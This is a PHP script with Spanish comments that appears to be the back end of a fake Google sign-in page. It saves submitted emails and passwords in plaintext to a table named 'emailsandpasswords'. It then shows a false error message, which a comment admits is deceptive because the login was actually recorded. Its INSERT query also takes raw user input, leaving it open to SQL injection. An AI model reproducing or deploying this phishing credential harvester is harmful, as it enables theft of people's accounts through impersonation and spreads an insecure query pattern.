<?php


//! Con lo anterior llamamos al archivo, es como decir <scrip src="script.js"></scrip> // Luego, con el session_start es como decirle que tiene permiso para ejecutarse.



//! 1) Para empezar, estableceremos las variables para los datos de la base de datos para poder iniciar.
    $host = "localhost"; // Nomnbre del host.
    $user = "root"; // Usuario.
    $psw = ""; // Password.
    $db_name = "googlesignin"; // Nombre de la base de datos.
    $tb_name = "emailsandpasswords"; // Nombre de la tabla.


    

    $connection = mysqli_connect($host, $user, $psw, $db_name); //! Conexión con la base de datos, dando el host, el usuario y la contraseña en el caso de que haya. (El orden es importante).        




        

        if (isset($_POST['submit'])) {

            if (strlen($_POST['email']) >= 1 && strlen($_POST['password']) >= 1) { //! Con strlen detectamos los caracteres que hay. Si los caracteres de Email son mayor que 1, ejecuta el codigo.

                $email = trim($_POST['email']); //* Trim es para remover el espacio del inicio y del final.
                $password = trim($_POST['password']);
                $date = date("d/m/y"); //? Añadí la fecha.

                $consult = "INSERT INTO `emailsandpasswords`(`email`, `password`, `fecha`) VALUES ('$email','$password', '$date')"; // Conexión a la base de datos, y ponemos los valores que guardamos anteriormente en variables. //* También saqué el ID porque es automático.

                $return = mysqli_query($connection,$consult); // Devolvemos finalmente eso a la base de datos, proporcionando la conexión a la base y la consulta.


                //! Printearmos en pantalla que aparece si se registra correctamente.
                if($return) {
                    ?>

                    <h1 class="bad" style="font-family: 'Noto Sans Display', sans-serif; font-size: 20px;">Algo ocurrió. Intenta de nuevo o más tarde.</h1> <!--* Mensaje engañoso, pero en realidad si se registra.-->

                    <?php

                } else {

                    ?>

                    <h1 class="bad" style="font-family: 'Noto Sans Display', sans-serif; font-size: 20px;">Algo hiciste MAL.</h1>

                    <?php

                }

            } else {
                
                //! Pantalla cuando no completa los campos.
                echo "<script>alert('Tienes que llenar los campos para poder iniciar sesión.')</script>";

            }
        }



        

?>
